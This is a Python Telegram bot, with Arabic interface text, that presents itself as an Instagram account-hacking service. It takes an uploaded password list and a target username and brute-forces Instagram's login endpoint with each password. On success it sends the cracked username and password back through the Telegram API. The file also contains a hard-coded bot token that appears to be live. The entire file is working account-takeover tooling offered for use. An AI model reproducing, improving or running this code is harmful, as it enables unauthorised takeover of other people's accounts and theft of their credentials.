from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters
import requests
import time
from user_agent import generate_user_agent

# خلي توكن وايدي جوه
BOT_TOKEN = "7611194546:AAEPJ_xSoDH3sS3112qQoJH78LIV1jgxkkA"
ADMIN_ID = "7115002714"

passwords = []
target_user = ""
failed_attempts = 0
successful_attempts = 0
report_message = None
is_running = False
start_time = None

async def start(update, context):
    chat_id = update.message.chat_id
    welcome_text = f"""⥃ مرحبا بك عزيزي في بوت اختراق محدد | انستا ♯ 
⥃ البوت يتميز بخدمة الاختراق و الـ ViP ✰
⥃ البوت يتميز بسرعة تنفيذ الاختراق ⥉
الـ 𝚒𝚍 الخاص بك ⥃ {chat_id}. 👤"""
    keyboard = [
        [InlineKeyboardButton("⛧ بدء اختراق ⛧", callback_data="start_bruteforce"),
         InlineKeyboardButton("⛧ إيقاف اختراق ⛧", callback_data="stop_bruteforce")],
        [InlineKeyboardButton("إضافة ملف باسورد 📂", callback_data="add_passwords")],
        [InlineKeyboardButton("  ֺ۪ ⭒ قناة البوت ⭒ ֺ۪", url="https://t.me/Scorpion_scorp"),
         InlineKeyboardButton("  ֺ۪ ⭒ المبرمج ⭒ ֺ۪ ", url="https://t.me/I_e_e_l")],
        [InlineKeyboardButton("⚠️ كيفية الاستخدام⚠️", url="https://t.me/I_e_e_l")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text=welcome_text, reply_markup=reply_markup)

async def add_passwords(update, context):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="دز ملف الباسوردات بصيغه (txt)")

async def handle_file(update, context):
    global passwords
    file = update.message.document
    if file:
        file_id = file.file_id
        file_obj = await context.bot.get_file(file_id)
        file_content = await file_obj.download_as_bytearray()
        passwords = file_content.decode('utf-8').splitlines()
        await update.message.reply_text(f"تمت إضافة {len(passwords)} كلمة مرور")

async def start_bruteforce(update, context):
    global is_running, start_time
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(text="دز يوزر نيم الحساب ب @")
    context.user_data["awaiting_username"] = True
    is_running = True
    start_time = time.time()

async def stop_bruteforce(update, context):
    global is_running
    query = update.callback_query
    await query.answer()
    is_running = False
    elapsed_time = int(time.time() - start_time)
    await query.edit_message_text(
        text=f"تم إيقاف الاختراق\n\n"
             f"محاولات فاشلة: {failed_attempts}\n"
             f"محاولات صحيحة: {successful_attempts}\n"
             f"مدة التشغيل: {elapsed_time} ثانية"
    )

async def handle_username(update, context):
    global target_user, failed_attempts, successful_attempts, report_message
    if context.user_data.get("awaiting_username"):
        target_user = update.message.text
        failed_attempts = 0
        successful_attempts = 0
        chat_id = update.message.chat_id
        report_message = await context.bot.send_message(chat_id=chat_id, text="بدء الاختراق...\n\nمحاولات فاشلة: 0\nمحاولات صحيحة: 0\nكلمات المرور المتبقية: 0")
        context.user_data["awaiting_username"] = False
        await brute_force(chat_id, context.bot)

async def brute_force(chat_id, bot):
    global passwords, target_user, failed_attempts, successful_attempts, report_message, is_running
    url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip,deflate,br',
        'accept-language': 'en-US,en;q=0.9,ar;q=0.8',
        'content-length': '269',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/',
        'user-agent': generate_user_agent(),
        'x-csrftoken': 'VOPH7fUUOP85ChEViZkd2PhLkUQoP8P8',
        'x-ig-app-id': '936619743392459',
        'x-requested-with': 'XMLHttpRequest'
    }

    for password in passwords.copy():
        if not is_running:
            break

        data = {
            'username': target_user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1589682409:{password}',
            'queryParams': '{}',
            'optIntoOneTap': 'false'
        }
        response = requests.post(url, headers=headers, data=data)

        if 'userId' in response.text:
            successful_attempts += 1
            passwords.remove(password)
            send = f'''https://api.telegram.org/bot{BOT_TOKEN}/sendMessage?chat_id={chat_id}&text= • ♠️ تم اختراق الحساب من قبل ابن بابل
            
user →: {target_user} 
pass →: {password}'''
            requests.post(send)
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=report_message.message_id,
                text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
            )
            break
        else:
            failed_attempts += 1
            passwords.remove(password)
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=report_message.message_id,
                text=f"محاولات فاشلة: {failed_attempts}\nمحاولات صحيحة: {successful_attempts}\nكلمات المرور المتبقية: {len(passwords)}"
            )

    await bot.send_message(chat_id, "انتهت العمليه 🕑")

application = Application.builder().token(BOT_TOKEN).build()

application.add_handler(CommandHandler("start", start))
application.add_handler(CallbackQueryHandler(add_passwords, pattern="add_passwords"))
application.add_handler(CallbackQueryHandler(start_bruteforce, pattern="start_bruteforce"))
application.add_handler(CallbackQueryHandler(stop_bruteforce, pattern="stop_bruteforce"))
application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))

application.run_polling()
